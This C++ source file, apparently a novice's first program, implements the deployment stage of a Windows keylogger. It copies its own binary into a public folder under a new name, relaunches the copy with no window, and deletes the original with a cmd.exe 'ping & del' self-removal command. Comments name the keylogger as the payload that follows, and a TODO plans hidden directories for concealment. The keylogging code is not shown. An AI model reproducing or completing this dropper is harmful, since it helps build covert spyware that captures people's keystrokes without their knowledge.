
/*
	choiSG (First cpp program ever coded == Great Spaghetti)

	Program Overview: 
		- Copies current binary to a new directory, with new name 
		- Runs the copied binary with modified commandline argument (stops infinite loop)
		- Deletes the original binary
*/

#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping localhost -n 1 -w 50 > nul & del /f /q \"%s\"")

// File Path of copied binary. Need to change.
const char copyFileDestination[MAX_PATH] = "C:\\Users\\Public\\cccc.exe";

using namespace std;

// Get FilePath of the current binary 
string getPath()
{
	char filePath[MAX_PATH];
	GetModuleFileNameA(NULL, filePath, MAX_PATH);
	
	return filePath;
}

/*	1. Make a new directory 
	2. Replicate the current binary into the newly made directory  
	3. The new binary's name is "copyFileDestination".

	4. TODO 
		A) Create hidden/complex directories to safely copy the current binary into.
		B) Search for potential directory path. Ignore invalid paths.
*/
void replicate()
{
	string filePath = getPath();
	const char directory[MAX_PATH] = "C:\\Users\\Public\\Public Logs";

	LPCSTR pcFilePath = filePath.c_str();

	CreateDirectory(directory, NULL);
	BOOL b = CopyFileA(pcFilePath, copyFileDestination, 0);
}

/*
	Run the copied version of this binary.
	Make sure to pass 2 argument (argc = 2), so that the replication won't happen again.

	param 1 copiedMe = copied binary's file path 
	arg = additional argument to pass to cmd,
		in order to stop endless replication/deletion of the binary
*/
void RunCopiedMe(const char copiedMe[], const char arg[])
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	
	char argPath[MAX_PATH];
	strcpy(argPath, copiedMe);
	strcat(argPath, " ");
	strcat(argPath, arg);

	// 2nd arg in CreateProcess need filepath + argv
	LPSTR lparg = const_cast<LPSTR>(argPath);

	CreateProcess(copiedMe, lparg, NULL, NULL, false, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

/*
	Delete the current binary.
*/
void DelMe()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileNameA(NULL, szModuleName, MAX_PATH);

	StringCbPrintfA(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void main(int argc, char* argv[])
{
	// Deployment starts.
	if (argc == 1)
	{
		replicate();
		RunCopiedMe(copyFileDestination, "stop");
		DelMe();
	}

	// Deployment have finished. Run the main Keylogger
	else
	{
		// [DEBUG] !!! This will hang the newly created program !!! 
		std::cin.get();
	}
}
